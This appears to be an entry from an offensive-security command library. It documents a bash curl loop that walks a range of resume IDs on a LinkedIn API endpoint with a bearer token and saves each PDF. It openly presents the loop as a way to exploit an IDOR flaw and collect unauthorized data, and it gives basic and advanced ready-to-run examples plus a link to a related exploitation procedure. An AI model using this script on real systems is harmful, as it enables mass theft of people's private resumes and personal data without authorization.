---
data: >-
  for id in {START_ID..END_ID}; do curl -H "Authorization: Bearer YOUR_TOKEN"
  "https://www.linkedin.com/api/resumes/$id/download" -o resume_$id.pdf --fail
  --silent && echo "Downloaded: $id" || echo "Failed: $id"; done
tags:
  - automation
  - enumeration
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.172Z'
id: 07546aa4-695b-4504-846a-376b16661f6f
verified: false
validated: true
submitted: true
---
# curl-batch-download

## Command

```bash
for id in {START_ID..END_ID}; do curl -H "Authorization: Bearer YOUR_TOKEN" "https://www.linkedin.com/api/resumes/$id/download" -o resume_$id.pdf --fail --silent && echo "Downloaded: $id" || echo "Failed: $id"; done
```

## Description

This bash loop command automates testing and downloading of multiple resume files by iterating over a range of file IDs on LinkedIn's endpoint, useful for exploiting IDOR to collect unauthorized data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{START_ID..END_ID}` | Bash range for file IDs (e.g., 10000..10100) | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Auth header | Yes |
| `"https://www.linkedin.com/api/resumes/$id/download"` | Dynamic endpoint URL | Yes |
| `-o resume_$id.pdf` | Output file per ID | Yes |
| `--fail --silent` | Error handling and quiet mode | No |

## Examples

### Basic Usage

```bash
for id in {10000..10010}; do curl -H "Authorization: Bearer abc123" "https://www.linkedin.com/api/resumes/$id/download" -o resume_$id.pdf --fail --silent && echo "Downloaded: $id"; done
```

### Advanced Usage

```bash
for id in {10000..10100}; do curl -H "Authorization: Bearer abc123" "https://www.linkedin.com/api/resumes/$id/download" -o resume_$id.pdf --fail --silent --max-time 10 && echo "Downloaded: $id" || echo "Failed: $id"; done
```

## Expected Output

Console logs showing "Downloaded: ID" for successful files and "Failed: ID" for errors, with PDF files saved for valid IDs.

## Related

- [[Related Procedure: Exploit-IDOR-for-Unauthorized-Resume-Access]]
